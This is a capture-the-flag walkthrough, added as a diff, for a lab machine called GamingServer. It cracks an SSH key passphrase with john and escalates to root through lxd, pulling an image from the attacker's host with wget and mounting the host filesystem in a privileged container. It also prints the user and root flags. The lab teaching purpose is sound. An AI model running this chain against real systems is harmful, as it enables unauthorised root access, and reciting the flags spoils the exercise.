@@ -264,3 +264,270 @@ The authenticity of host '10.10.252.17 (10.10.252.17)' can't be established.
 ED25519 key fingerprint is SHA256:3Kz4ZAujxMQpTzzS0yLL9dLKLGmA1HJDOLAQWfmcabo.
 This key is not known by any other names
 Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.10.252.17' (ED25519) to the list of known hosts.
+Enter passphrase for key 'secretKey':
+```
+```text
+┌──(kali㉿kali)-[~/confidential/gamingserver]
+└─$ ssh2john secretKey > secretKey.hash
+
+the wordlist need to be dict.list :) but rockyou it also works
+```
+```text
+┌──(kali㉿kali)-[~/confidential/gamingserver]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt secretKey.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
+Cost 2 (iteration count) is 1 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+letmein          (secretKey)     
+1g 0:00:00:00 DONE (2022-09-19 13:59) 50.00g/s 25600p/s 25600c/s 25600C/s teiubesc..letmein
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed.
+```
+```text
+┌──(kali㉿kali)-[~/confidential/gamingserver]
+└─$ john --wordlist=dict.lst secretKey.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+No password hashes left to crack (see FAQ)
+```
+```text
+┌──(kali㉿kali)-[~/confidential/gamingserver]
+└─$ john --wordlist=dict.lst secretKey.hash 
+Using default input encoding: UTF-8
+Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
+No password hashes left to crack (see FAQ)
+```
+```text
+┌──(kali㉿kali)-[~/confidential/gamingserver]
+└─$ ssh -i secretKey john@10.10.252.17 
+Enter passphrase for key 'secretKey': 
+Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Mon Sep 19 18:02:36 UTC 2022
+
+  System load:  0.0               Processes:           96
+  Usage of /:   41.1% of 9.78GB   Users logged in:     0
+  Memory usage: 32%               IP address for eth0: 10.10.252.17
+  Swap usage:   0%
+
+0 packages can be updated.
+0 updates are security updates.
+
+Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
+john@exploitable:~$ ls
+user.txt
+john@exploitable:~$ cat user.txt
+a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e
+
+priv esc [lxd](https://www.hackingarticles.in/lxd-privilege-escalation/)
+
+john@exploitable:~$ id
+uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+```
+```text
+┌──(kali㉿kali)-[~/chill_hack]
+└─$ cd ../confidential/gamingserver
+```
+```text
+┌──(kali㉿kali)-[~/confidential/gamingserver]
+└─$ ls
+dict.lst  secretKey  secretKey.hash
+```
+```text
+┌──(kali㉿kali)-[~/confidential/gamingserver]
+└─$ git clone  https://github.com/saghul/lxd-alpine-builder.git
+Cloning into 'lxd-alpine-builder'...
+remote: Enumerating objects: 50, done.
+remote: Counting objects: 100% (8/8), done.
+remote: Compressing objects: 100% (6/6), done.
+remote: Total 50 (delta 2), reused 5 (delta 2), pack-reused 42
+Receiving objects: 100% (50/50), 3.11 MiB | 3.41 MiB/s, done.
+Resolving deltas: 100% (15/15), done.
+```
+```text
+┌──(kali㉿kali)-[~/confidential/gamingserver]
+└─$ ls
+dict.lst  lxd-alpine-builder  secretKey  secretKey.hash
+```
+```text
+┌──(kali㉿kali)-[~/confidential/gamingserver]
+└─$ cd lxd-alpine-builder
+```
+```text
+┌──(kali㉿kali)-[~/confidential/gamingserver/lxd-alpine-builder]
+└─$ ls
+alpine-v3.13-x86_64-20210218_0139.tar.gz  build-alpine  LICENSE  README.md
+```
+```text
+┌──(kali㉿kali)-[~/confidential/gamingserver/lxd-alpine-builder]
+└─$ ./build-alpine 
+build-alpine: must be run as root
+```
+```text
+┌──(kali㉿kali)-[~/confidential/gamingserver/lxd-alpine-builder]
+└─$ sudo ./build-alpine            
+[sudo] password for kali: 
+Determining the latest release... v3.16
+Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.16/main/x86_64
+Downloading apk-tools-static-2.12.9-r3.apk
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+Downloading alpine-keys-2.4-r1.apk
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
+alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub: OK
+Verified OK
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+100  2663  100  2663    0     0    841      0  0:00:03  0:00:03 --:--:--   841
+--2022-09-19 14:05:34--  http://alpine.mirror.wearetriple.com/MIRRORS.txt
+Resolving alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)... 93.187.10.106, 2a00:1f00:dc06:10::106
+Connecting to alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)|93.187.10.106|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2663 (2.6K) [text/plain]
+Saving to: ‘/home/kali/confidential/gamingserver/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’
+
+/home/kali/confidential 100%[=============================>]   2.60K  --.-KB/s    in 0s      
+
+2022-09-19 14:05:35 (138 MB/s) - ‘/home/kali/confidential/gamingserver/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’ saved [2663/2663]
+
+Selecting mirror http://repo.iut.ac.ir/repo/alpine/v3.16/main
+fetch http://repo.iut.ac.ir/repo/alpine/v3.16/main/x86_64/APKINDEX.tar.gz
+(1/21) Installing alpine-baselayout-data (3.2.0-r23)
+(2/21) Installing musl (1.2.3-r0)
+(3/21) Installing busybox (1.35.0-r17)
+Executing busybox-1.35.0-r17.post-install
+(4/21) Installing alpine-baselayout (3.2.0-r23)
+Executing alpine-baselayout-3.2.0-r23.pre-install
+Executing alpine-baselayout-3.2.0-r23.post-install
+(5/21) Installing ifupdown-ng (0.12.1-r0)
+(6/21) Installing openrc (0.44.10-r7)
+Executing openrc-0.44.10-r7.post-install
+(7/21) Installing alpine-conf (3.14.6-r0)
+(8/21) Installing ca-certificates-bundle (20220614-r0)
+(9/21) Installing libcrypto1.1 (1.1.1q-r0)
+(10/21) Installing libssl1.1 (1.1.1q-r0)
+(11/21) Installing ssl_client (1.35.0-r17)
+(12/21) Installing zlib (1.2.12-r3)
+(13/21) Installing apk-tools (2.12.9-r3)
+(14/21) Installing busybox-suid (1.35.0-r17)
+(15/21) Installing mdev-conf (4.2-r0)
+(16/21) Installing busybox-initscripts (4.2-r0)
+Executing busybox-initscripts-4.2-r0.post-install
+(17/21) Installing scanelf (1.3.4-r0)
+(18/21) Installing musl-utils (1.2.3-r0)
+(19/21) Installing libc-utils (0.7.2-r3)
+(20/21) Installing alpine-keys (2.4-r1)
+(21/21) Installing alpine-base (3.16.2-r0)
+Executing busybox-1.35.0-r17.trigger
+OK: 8 MiB in 21 packages
+```
+```text
+┌──(kali㉿kali)-[~/confidential/gamingserver/lxd-alpine-builder]
+└─$ python3 -m http.server     
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+priv esc lxd
+
+john@exploitable:~$ id
+uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
+
+john@exploitable:~$ wget http://10.18.1.77:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
+--2022-09-19 18:08:35--  http://10.18.1.77:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
+Connecting to 10.18.1.77:8000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 3259593 (3.1M) [application/gzip]
+Saving to: ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’
+
+alpine-v3.13-x86_64-202 100%[=============================>]   3.11M   244KB/s    in 16s     
+
+2022-09-19 18:08:51 (203 KB/s) - ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’ saved [3259593/3259593]
+
+john@exploitable:~$ lxc image list
++-------+-------------+--------+-------------+------+------+-------------+
+| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
++-------+-------------+--------+-------------+------+------+-------------+
+john@exploitable:~$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias myimage
+Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a78
+john@exploitable:~$ lxc image list
++---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+|  ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE          |
++---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+| myimage | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | Sep 19, 2022 at 6:10pm (UTC) |
++---------+--------------+--------+-------------------------------+--------+--------+------------------------------+
+john@exploitable:~$ lxc init myimage ignite -c security.privileged=true
+Creating ignite
+john@exploitable:~$ lxc config device add ignite mydevice disk source=/ path=/mnt/root/ recursive=true
+Device mydevice added to ignite
+john@exploitable:~$ lxc start ignite
+john@exploitable:~$ lxc exec ignite /bin/sh
+~ # id
+uid=0(root) gid=0(root)
+~ # find / -type f -name root.txt 2>/dev/null
+/mnt/root/root/root.txt
+ca^H^H^H~ # cat /mnt/root/root/root.txt
+2e337b8c9f3aff0c2b3e8d4e6a7c88fc
+```
+```text
+┌──(kali㉿kali)-[~/confidential/gamingserver/lxd-alpine-builder]
+└─$ python3 -m http.server     
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.10.252.17 - - [19/Sep/2022 14:07:54] code 404, message File not found
+10.10.252.17 - - [19/Sep/2022 14:07:54] "GET /alpine-v3.12-x86_64-20200902_1515.tar.gz HTTP/1.1" 404 -
+10.10.252.17 - - [19/Sep/2022 14:08:35] "GET /alpine-v3.13-x86_64-20210218_0139.tar.gz HTTP/1.1" 200 -
+```
+What is the user flag?
+*a5c2ff8b9c2e3d4fe9d4ff2f1a5a6e7e*
+What is the root flag?
+*2e337b8c9f3aff0c2b3e8d4e6a7c88fc*
+
+## Notes / Lessons Learned
+[[Confidential]]
+
